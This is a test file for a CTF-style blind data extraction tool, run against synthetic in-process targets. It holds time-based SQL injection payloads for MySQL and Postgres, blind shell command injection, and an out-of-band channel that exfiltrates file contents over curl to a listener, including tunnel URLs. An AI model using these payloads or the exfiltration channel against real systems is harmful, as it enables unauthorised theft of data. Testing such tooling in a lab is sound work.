"""B-255: the calibrated blind extraction adapter (solvers/web/blind_extract.py, matrix WR5).

Every "target" here is in-process and synthetic, and time is simulated: send() returns the elapsed
seconds a fake back end reports (base latency, seeded jitter, plus whatever SLEEP the payload really
ran), so no test sleeps or depends on machine load. The payloads are run for real where it is cheap:
the MySQL forms in SQLite (with MySQL's functions registered), the shell forms in /bin/sh with `sleep`
replaced by a recorder, and the out-of-band form through /bin/sh, curl and the real tools/oob.py
listener on 127.0.0.1.
"""
import base64
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import time

import pytest

import blind_extract as bx
import oob

SECRET = "flag{bl1nd_t1m3_0k}"


# -------------------------------------------------------------------------------------- fake targets

class SqlTarget:
    """A MySQL-ish back end in SQLite: `SELECT 1 FROM users WHERE id=1 AND <injected>`. IF is MySQL's
    lazy IF (rendered as SQLite's iif), SLEEP adds to the simulated elapsed time."""

    def __init__(self, secret, *, base=0.08, jitter=0.05, seed=7, slow_any_sleep=0.0, postgres=False):
        self.db = sqlite3.connect(":memory:")
        self.db.execute("CREATE TABLE users(id INTEGER, secret BLOB)")
        self.db.execute("INSERT INTO users VALUES (1, ?)", (secret if isinstance(secret, bytes) else secret.encode(),))
        self.slept = 0.0
        self.rng = random.Random(seed)
        self.base, self.jitter, self.slow_any_sleep = base, jitter, slow_any_sleep
        self.drift = 0.0
        self.requests = 0

        def sleep(s):
            self.slept += float(s)
            return 0
        self.db.create_function("SLEEP", 1, sleep)
        self.db.create_function("pg_sleep", 1, sleep)
        self.db.create_function("ASCII", 1, lambda b: (b[0] if isinstance(b, bytes) else ord(b[0])) if b else 0)
        self.db.create_function("CHAR_LENGTH", 1, lambda b: len(b))
        self.postgres = postgres

    def send(self, payload):
        self.requests += 1
        sql = payload
        sql = re.sub(r"\bIF\(", "iif(", sql)
        sql = re.sub(r"\(SELECT 1 FROM pg_sleep\(([0-9.]+)\)\)", r"(pg_sleep(\1)+1)", sql)
        self.slept = 0.0
        self.db.execute(f"SELECT 1 FROM users WHERE id=1 AND {sql}").fetchall()
        waf = self.slow_any_sleep if re.search(r"(?i)sleep", payload) else 0.0
        return self.base + self.drift + self.rng.uniform(0, self.jitter) + self.slept + waf


def sql_wrap(snippet):
    return snippet                       # the fake places it after "AND"


EXPR = "SELECT secret FROM users WHERE id=1"


# ---------------------------------------------------------------------------------------- timing

def test_mysql_timing_extraction_recovers_the_secret_and_confirms_every_byte():
    t = SqlTarget(SECRET)
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="timing", delay=1.0, max_len=64)
    assert res["value"] == SECRET and res["channel"] == "timing" and res["dialect"] == "mysql"
    assert res["length"] == len(SECRET) and not res["truncated"] and res["confirmed_bytes"] == len(SECRET)
    assert res["requests"] == t.requests
    cal = res["calibration"]
    assert cal["delay"] == 1.0 and max(cal["false"]) < cal["threshold"] < min(cal["true"])


def test_postgres_forms_extract_and_render_the_known_payload_shape():
    assert bx.POSTGRES.timed("1=1", 2) == "(CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(2)) ELSE 1 END)=1"
    assert bx.MYSQL.timed(bx.MYSQL.char_gt("q", 3, 100), 1.5) == "IF((ASCII(SUBSTRING((q),3,1))>100),SLEEP(1.5),0)"
    t = SqlTarget("pg-secret", postgres=True)
    t.db.create_function("LENGTH", 1, lambda b: len(b))
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.POSTGRES, mode="timing", delay=1.0)
    assert res["value"] == "pg-secret"


def test_bytes_outside_the_printable_range_are_found_by_the_wide_retry():
    secret = b"A\x01\xffZ"
    t = SqlTarget(secret)
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="timing", delay=1.0)
    assert res["value_bytes"] == secret


def test_length_cap_marks_the_value_truncated():
    t = SqlTarget("abcdefghij")
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="timing", delay=1.0, max_len=4)
    assert res["value"] == "abcd" and res["truncated"] and res["length"] == 4
    assert bx.extract(EXPR, send=SqlTarget("").send, wrap=sql_wrap, dialect=bx.MYSQL, mode="timing",
                      delay=1.0)["value"] == ""


def test_no_signal_raises_calibration_error_after_doubling_the_delay():
    rng = random.Random(1)
    sent = []

    def flat(payload):                    # the condition never runs: every answer is just latency
        sent.append(payload)
        return 0.1 + rng.uniform(0, 0.05)

    ch = bx.TimingChannel(flat, sql_wrap, bx.MYSQL, delay=1.0, max_delay=4.0, samples=3)
    with pytest.raises(bx.CalibrationError, match="no timing signal") as ei:
        ch.calibrate()
    assert [a["delay"] for a in ei.value.detail["attempts"]] == [1.0, 2.0, 4.0]
    assert "SLEEP(4)" in sent[-1]


def test_a_waf_that_slows_any_sleep_payload_is_not_a_signal():
    t = SqlTarget(SECRET, slow_any_sleep=3.0)                 # slow, but true and false alike
    t.db.create_function("SLEEP", 1, lambda s: 0)              # and the condition never sleeps
    with pytest.raises(bx.CalibrationError):
        bx.TimingChannel(t.send, sql_wrap, bx.MYSQL, delay=1.0).calibrate()


@pytest.mark.parametrize("seed", [3, 11, 29, 41])
def test_jitter_larger_than_the_delay_is_overcome_by_a_longer_delay(seed):
    t = SqlTarget(SECRET, jitter=1.6, seed=seed)
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="timing", delay=0.5,
                     max_delay=8.0, samples=5)
    assert res["value"] == SECRET
    assert res["calibration"]["delay"] > 1.6          # doubled past the jitter


def test_latency_drift_out_of_the_envelope_is_caught_and_recalibrated():
    t = SqlTarget(SECRET)
    ch = bx.TimingChannel(t.send, sql_wrap, bx.MYSQL, delay=1.0, recheck_every=0)   # the envelope alone
    ch.calibrate()
    t.drift = 1.5                                             # the whole server got slower than the delay
    res = bx.extract_timing(ch, EXPR)
    assert res["value_bytes"].decode() == SECRET and res["recalibrations"] >= 1
    assert res["calibration"]["threshold"] > 1.5


class Scripted:
    """A fake back end with exact readings: true conditions read `t`, false ones `f`, and a queue of
    scripted readings (`script`) answers the next requests first. `log` keeps every payload."""

    def __init__(self, t=1.1, f=0.1):
        self.t, self.f, self.script, self.log = t, f, [], []

    def send(self, payload):
        self.log.append(payload)
        if self.script:
            return self.script.pop(0)
        return self.t if "((1=1)" in payload else self.f


def test_a_false_control_that_reads_true_inside_the_envelope_recalibrates_through_the_recheck():
    """The drift the envelope cannot see: the false control reads like a true answer (slow, but inside
    the calibrated envelope), so only the every-`recheck_every` control re-read catches it."""
    sc = Scripted()
    ch = bx.TimingChannel(sc.send, sql_wrap, bx.MYSQL, delay=1.0, samples=2, recheck_every=3)
    cal = ch.calibrate()
    flipped = min(cal.true_readings)
    assert cal.low <= flipped <= cal.high and flipped > cal.threshold + cal.guard   # in the envelope, reads True
    answers = [ch.ask("1=1"), ch.ask("1=0")]                  # questions 1 and 2: no recheck yet
    assert answers == [True, False] and ch.recalibrations == 0
    before = len(sc.log)
    sc.script = [flipped]                                     # the 3rd question's control re-read reads True
    assert ch.ask("1=0") is False
    assert ch.recalibrations == 1
    false_control = bx.MYSQL.timed(bx.MYSQL.false, 1.0)
    assert sc.log[before] == false_control                    # the recheck read the false control first
    assert len(sc.log) - before == 1 + 2 * 2 + 1              # control, recalibration (2 samples x 2), the question
    for _ in range(3):                                        # a control that reads false recalibrates nothing
        ch.ask("1=1")
    assert ch.recalibrations == 1


@pytest.mark.parametrize("control, why", [
    ([0.6, 0.6, 0.6], "guard band"),       # every retry of the control lands on the threshold: undecided
    ([2.0], "out of the envelope"),        # the control reads past the calibrated high: drift
])
def test_a_false_control_that_is_undecided_or_drifts_also_recalibrates(control, why):
    """ask(): a control that does not read False recalibrates, not only one that reads True."""
    sc = Scripted()
    ch = bx.TimingChannel(sc.send, sql_wrap, bx.MYSQL, delay=1.0, samples=2, retries=3, recheck_every=3)
    cal = ch.calibrate()
    assert (cal.threshold, cal.guard, cal.high) == pytest.approx((0.6, 0.25, 1.35))
    assert [ch.ask("1=1"), ch.ask("1=0")] == [True, False] and ch.recalibrations == 0
    before = len(sc.log)
    sc.script = list(control)
    assert ch.ask("1=1") is True
    assert ch.recalibrations == 1, why
    assert sc.log[before] == bx.MYSQL.timed(bx.MYSQL.false, 1.0)
    assert len(sc.log) - before == len(control) + 2 * 2 + 1   # control reads, recalibration, the question


def test_a_reading_in_the_guard_band_is_asked_again_and_all_guard_readings_recalibrate():
    sc = Scripted()
    ch = bx.TimingChannel(sc.send, sql_wrap, bx.MYSQL, delay=1.0, samples=2, retries=3, recheck_every=0)
    cal = ch.calibrate()
    assert (cal.threshold, cal.guard) == pytest.approx((0.6, 0.25))
    above, below = cal.threshold + cal.guard / 2, cal.threshold - cal.guard / 2   # both inside the guard band
    n = len(sc.log)
    sc.script = [below, 1.1]                                  # undecided, then a decisive true
    assert ch.ask("1=0") is True and len(sc.log) - n == 2
    n = len(sc.log)
    sc.script = [above, 0.1]                                  # undecided, then a decisive false
    assert ch.ask("1=1") is False and len(sc.log) - n == 2
    assert ch.recalibrations == 0
    n = len(sc.log)
    sc.script = [above, below, above]                         # every retry undecided: recalibrate, ask again
    assert ch.ask("1=1") is True
    assert ch.recalibrations == 1 and len(sc.log) - n == 3 + 2 * 2 + 1


def test_budget_exhaustion_keeps_the_partial_value():
    t = SqlTarget(SECRET)
    ch = bx.TimingChannel(t.send, sql_wrap, bx.MYSQL, delay=1.0, max_requests=60)
    with pytest.raises(bx.BudgetExhausted) as ei:
        bx.extract_timing(ch, EXPR)
    assert ei.value.partial and SECRET.encode().startswith(ei.value.partial)
    assert t.requests == 60


def test_send_must_report_elapsed_time():
    ch = bx.TimingChannel(lambda p: {"status": 200}, sql_wrap, bx.MYSQL, delay=1.0)
    with pytest.raises(bx.BlindError, match="no elapsed time"):
        ch.calibrate()
    with pytest.raises(ValueError):
        bx.TimingChannel(lambda p: 0.0, sql_wrap, bx.MYSQL, delay=0)


@pytest.mark.needs_tool("sh", "od", "head", "tail", "wc")
def test_shell_forms_run_in_a_real_sh(tmp_path):
    """The SHELL dialect's questions, run by /bin/sh as a blind command injection would run them; the
    target's `sleep` is a function that reports the seconds it was asked for."""
    secret_file = tmp_path / "s.txt"
    secret = b"s3cr3t-\x7f!"
    secret_file.write_bytes(secret)
    sh = shutil.which("sh")

    def send(payload):
        script = 'sleep() { echo "SLEPT $1"; }\n' + payload
        out = subprocess.run([sh, "-c", script], capture_output=True, text=True, timeout=30).stdout
        m = re.search(r"SLEPT ([0-9.]+)", out)
        return 0.05 + (float(m.group(1)) if m else 0.0)

    res = bx.extract(f"cat {secret_file}", send=send, wrap=lambda s: f"echo hi; {s}", dialect=bx.SHELL,
                     mode="timing", delay=1.0, samples=2)
    assert res["value_bytes"] == secret


# ---------------------------------------------------------------------------------- channel choice

def test_channel_choice_never_assumes_out_of_band():
    with pytest.raises(bx.ChannelUnusable, match="confirmed reachability"):
        bx.choose_channel("oob", {"verdict": "plausible"})
    with pytest.raises(bx.ChannelUnusable, match="missing"):
        bx.choose_channel("oob", None)
    assert bx.choose_channel("oob", {"verdict": "confirmed"})[0] == "oob"
    kind, why = bx.choose_channel("auto", {"verdict": "unproven"})
    assert kind == "timing" and "unproven" in why
    assert bx.choose_channel("auto", {"verdict": "confirmed"})[0] == "oob"
    with pytest.raises(ValueError):
        bx.choose_channel("guess")
    t = SqlTarget("x1")
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="auto", reach={"verdict": "plausible"},
                     delay=1.0)
    assert res["channel"] == "timing" and "plausible" in res["channel_why"] and res["value"] == "x1"
    # listener=None: these cases are about the dialect and the arguments, not the listener check
    res = bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="auto",
                     reach={"verdict": "confirmed"}, listener=None, delay=1.0)
    assert res["channel"] == "timing" and "no out-of-band form" in res["channel_why"]
    with pytest.raises(bx.ChannelUnusable, match="no out-of-band form"):
        bx.extract(EXPR, send=t.send, wrap=sql_wrap, dialect=bx.MYSQL, mode="oob", reach={"verdict": "confirmed"},
                   listener=None)
    with pytest.raises(bx.ChannelUnusable, match="base="):
        bx.extract("id", send=t.send, wrap=str, dialect=bx.SHELL, mode="oob", reach={"verdict": "confirmed"},
                   listener=None)


def test_a_confirmed_report_for_another_listener_does_not_open_the_out_of_band_channel():
    rep = {"verdict": "confirmed",
           "listener": {"base": "https://old-name.trycloudflare.com", "started": 100.0}}
    now = {"pid": 1, "bind": "127.0.0.1", "port": 8380, "public": True, "started": 100.0,
           "public_url": "https://old-name.trycloudflare.com"}
    assert bx.reach_mismatch(rep, "https://old-name.trycloudflare.com/", now) is None
    assert bx.choose_channel("oob", rep, base="https://old-name.trycloudflare.com", listener=now)[0] == "oob"
    # the quick tunnel restarted on a new URL: the old confirmation proves nothing about it
    with pytest.raises(bx.ChannelUnusable, match="made for https://old-name.trycloudflare.com, not https://new"):
        bx.choose_channel("oob", rep, base="https://new-name.trycloudflare.com")
    kind, why = bx.choose_channel("auto", rep, base="https://new-name.trycloudflare.com")
    assert kind == "timing" and "another listener" in why
    # same URL, but the listener restarted since the report
    with pytest.raises(bx.ChannelUnusable, match="started at 100.0; this one started at 250.0"):
        bx.choose_channel("oob", rep, base="https://old-name.trycloudflare.com", listener=dict(now, started=250.0))
    with pytest.raises(bx.ChannelUnusable, match="now serves https://other"):
        bx.choose_channel("oob", rep, listener=dict(now, public_url="https://other.trycloudflare.com"))
    with pytest.raises(bx.ChannelUnusable, match="no listener is up"):
        bx.choose_channel("oob", rep, base="https://old-name.trycloudflare.com", listener={})
    with pytest.raises(bx.ChannelUnusable, match="names no listener"):
        bx.choose_channel("oob", {"verdict": "confirmed"}, base="https://old-name.trycloudflare.com")
    lan = {"pid": 1, "bind": "10.200.3.9", "port": 8380, "started": 7.0}
    assert bx.reach_mismatch({"verdict": "confirmed", "listener": {"base": "http://10.200.3.9:8380", "started": 7.0}},
                             None, lan) is None
    # extract() applies it: auto with a stale report runs timing and says why
    calls = []
    res = bx.extract("id", send=lambda p: calls.append(p) or (1.1 if "if true;" in p else 0.1), wrap=str,
                     dialect=bx.SHELL, mode="auto", reach=rep, base="https://new-name.trycloudflare.com",
                     token="o0123456789ab", hits=lambda tok: pytest.fail("no out-of-band read expected"),
                     listener=None, delay=1.0, samples=2, max_len=0)
    assert res["channel"] == "timing" and "another listener" in res["channel_why"] and calls


def _shell_timing(calls):
    return lambda p: calls.append(p) or (1.1 if "if true;" in p else 0.1)


def test_extract_checks_the_report_against_the_current_listener(monkeypatch):
    """A listener restarted on the same bind and port (same base, a new `started`): the report proves
    a route to the old process, so extract() must not take the out-of-band channel on it, whether the
    state is passed or looked up (oob.running(), the default)."""
    base, tok = "http://127.0.0.1:8380", "o0123456789ab"
    rep = {"verdict": "confirmed", "listener": {"base": base, "started": 100.0}}
    same = {"pid": 1, "bind": "127.0.0.1", "port": 8380, "started": 100.0}
    restarted = dict(same, started=250.0)

    def no_oob(tok):
        pytest.fail("no out-of-band read expected")

    kw = dict(wrap=str, dialect=bx.SHELL, reach=rep, base=base, token=tok, delay=1.0, samples=2, max_len=0)
    with pytest.raises(bx.ChannelUnusable, match="started at 100.0; this one started at 250.0"):
        bx.extract("id", send=_shell_timing([]), mode="oob", listener=restarted, hits=no_oob, **kw)
    calls = []
    res = bx.extract("id", send=_shell_timing(calls), mode="auto", listener=restarted, hits=no_oob, **kw)
    assert res["channel"] == "timing" and "started at 250.0" in res["channel_why"] and calls
    # the matching listener does open it: one exfil request, the value read back by token
    sent = []
    hit = [{"path": f"/{tok}/x1", "body": base64.b64encode(b"uid=0").decode()}]
    res = bx.extract("id", send=sent.append, mode="oob", listener=same, hits=lambda t: hit, **kw)
    assert res["channel"] == "oob" and res["value"] == "uid=0" and len(sent) == 1 and f"{base}/{tok}/x1" in sent[0]
    # the default looks the listener up: restarted refuses, none up refuses, the same one is used
    monkeypatch.setattr(oob, "running", lambda: dict(restarted))
    with pytest.raises(bx.ChannelUnusable, match="this one started at 250.0"):
        bx.extract("id", send=_shell_timing([]), mode="oob", hits=no_oob, **kw)
    monkeypatch.setattr(oob, "running", lambda: {})
    with pytest.raises(bx.ChannelUnusable, match="no listener is up"):
        bx.extract("id", send=_shell_timing([]), mode="oob", hits=no_oob, **kw)
    monkeypatch.setattr(oob, "running", lambda: dict(same))
    assert bx.extract("id", send=lambda p: None, mode="auto", hits=lambda t: hit, **kw)["channel"] == "oob"
    # timing, or a report that is not confirmed, never needs the listener: it is not looked up
    monkeypatch.setattr(oob, "running", lambda: pytest.fail("no listener lookup expected"))
    assert bx.extract("id", send=_shell_timing([]), mode="timing", hits=no_oob, **kw)["channel"] == "timing"
    assert bx.extract("id", send=_shell_timing([]), mode="auto", hits=no_oob,
                      **dict(kw, reach={"verdict": "plausible"}))["channel"] == "timing"


def test_the_listener_base_is_rendered_by_the_collector_itself(monkeypatch):
    """reach_mismatch compares the report's base with oob.shown_base(state), the very function `oob.py
    reach` wrote it with, so a format change there (IPv6 brackets, say) cannot make every report stale."""
    st = {"pid": 1, "bind": "::1", "port": 8380, "started": 5.0}
    rep = {"verdict": "confirmed", "listener": {"base": "http://[::1]:8380", "started": 5.0}}
    monkeypatch.setattr(oob, "shown_base", lambda s: f"http://[{s['bind']}]:{s['port']}")
    assert bx.reach_mismatch(rep, None, st) is None
    assert bx.choose_channel("oob", rep, listener=st)[0] == "oob"
    monkeypatch.undo()
    assert bx.listener_base({"bind": "10.0.0.2", "port": 81}) == oob.base_url("10.0.0.2", 81)
    assert bx.listener_base({"public_url": "https://a.trycloudflare.com/", "bind": "127.0.0.1",
                             "port": 1}) == "https://a.trycloudflare.com"
    with pytest.raises(bx.BlindError, match="no public_url and no bind"):
        bx.listener_base({"started": 1.0})


def test_decode_hit_reads_a_base64_body_or_the_d_parameter():
    assert bx.decode_hit({"body": base64.b64encode(b"v\x00al").decode() + "\n"}) == b"v\x00al"
    assert bx.decode_hit({"body_b64": base64.b64encode(base64.b64encode(b"zz")).decode()}) == b"zz"
    assert bx.decode_hit({"body": "", "path": "/o0123456789ab/xxe?d=root%3Ax%3A0"}) == b"root:x:0"
    with pytest.raises(bx.BlindError, match="not base64"):
        bx.decode_hit({"body": "not base64!!"})
    with pytest.raises(bx.BlindError, match="no value"):
        bx.decode_hit({"body": "", "path": "/o0123456789ab/x1"})


def test_oob_channel_times_out_loudly_with_an_injected_clock():
    now = [0.0]
    ch = bx.OobChannel(lambda p: None, str, bx.SHELL, base="http://127.0.0.1:1", token="o0123456789ab",
                       hits=lambda tok: [{"path": "/o0123456789ab/x9", "body": "eA=="}], wait=5,
                       sleep=lambda s: now.__setitem__(0, now[0] + s), clock=lambda: now[0])
    with pytest.raises(bx.BlindError, match="no callback to /o0123456789ab/x1 within 5 s"):
        ch.fetch("id")
    assert now[0] >= 5


@pytest.mark.needs_tool("sh", "curl", "base64")
def test_oob_extraction_end_to_end_through_sh_curl_and_the_real_collector(monkeypatch, tmp_path):
    monkeypatch.setenv("CTF_WORKDIR", str(tmp_path))
    stop, ready = threading.Event(), []
    th = threading.Thread(target=oob.serve, args=("127.0.0.1", 0, None, time.time() + 300),
                          kwargs={"write_state": False, "stop": stop, "ready": ready}, daemon=True)
    th.start()
    for _ in range(200):
        if ready:
            break
        stop.wait(0.05)
    assert ready
    try:
        tok = oob.mint("blind-extract test")
        (tmp_path / "flag.txt").write_bytes(b"flag{oob_w0rks}\x00tail")
        sh = shutil.which("sh")
        sent = []

        def send(payload):              # the injectable command runs the payload (our own text, our own sh)
            sent.append(payload)
            subprocess.run([sh, "-c", payload], capture_output=True, timeout=30)

        port = ready[0][0]
        res = bx.extract(f"cat {tmp_path / 'flag.txt'}", send=send, wrap=lambda s: f"true; {s}", dialect=bx.SHELL,
                         mode="oob", base=f"http://127.0.0.1:{port}", token=tok, wait=30,
                         listener={"bind": "127.0.0.1", "port": port, "started": 1.0},
                         reach={"verdict": "confirmed",
                                "listener": {"base": f"http://127.0.0.1:{port}", "started": 1.0}})
        assert res["value_bytes"] == b"flag{oob_w0rks}\x00tail"
        assert res["channel"] == "oob" and res["requests"] == 1 and len(sent) == 1
    finally:
        stop.set()
        th.join(10)


# ------------------------------------------------------------------------------------- web_sender

@pytest.fixture
def http_target():
    """A toy HTTP back end on 127.0.0.1 (the suite's scope profile allows loopback): it records what
    arrived and sleeps 0.3 s for a request whose decoded input contains SLEEP."""
    import http.server
    import urllib.parse as up
    seen = []

    class H(http.server.BaseHTTPRequestHandler):
        def _answer(self, body=b""):
            u = up.urlsplit(self.path)
            seen.append({"method": self.command, "path": up.unquote(u.path), "query": up.parse_qs(u.query),
                         "form": up.parse_qs(body.decode()), "ctype": self.headers.get("Content-Type"),
                         "x": self.headers.get("X-Probe")})
            if "SLEEP" in up.unquote(self.path) + up.unquote(body.decode()):
                time.sleep(0.3)
            self.send_response(200)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"ok")

        def do_GET(self):
            self._answer()

        def do_POST(self):
            self._answer(self.rfile.read(int(self.headers.get("Content-Length") or 0)))

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    yield srv.server_address[1], seen
    srv.shutdown()
    th.join(10)


def test_web_sender_places_the_payload_and_reports_the_elapsed_time(http_target):
    import web
    port, seen = http_target
    client = web.WebClient(f"http://127.0.0.1:{port}/", timeout=10.0)
    payload = bx.MYSQL.timed("1=1", 0.3)                       # IF((1=1),SLEEP(0.3),0)
    r = bx.web_sender(client, "/item", "id")(payload)
    assert seen[-1]["method"] == "GET" and seen[-1]["query"]["id"] == [payload]
    # wall clock by design (the elapsed time IS the signal): a lower bound only, which load cannot break
    assert bx._elapsed_of(r) >= 0.3
    bx.web_sender(client, "/search", "q", method="post", headers={"X-Probe": "1"})("x' AND 1=0-- -")
    assert seen[-1]["method"] == "POST" and seen[-1]["form"]["q"] == ["x' AND 1=0-- -"]
    assert seen[-1]["ctype"] == "application/x-www-form-urlencoded" and seen[-1]["x"] == "1"
    bx.web_sender(client, "/run/{}")("a;b")
    assert seen[-1]["path"] == "/run/a;b"
    with pytest.raises(ValueError):
        bx.web_sender(client, "/no-slot")("x")
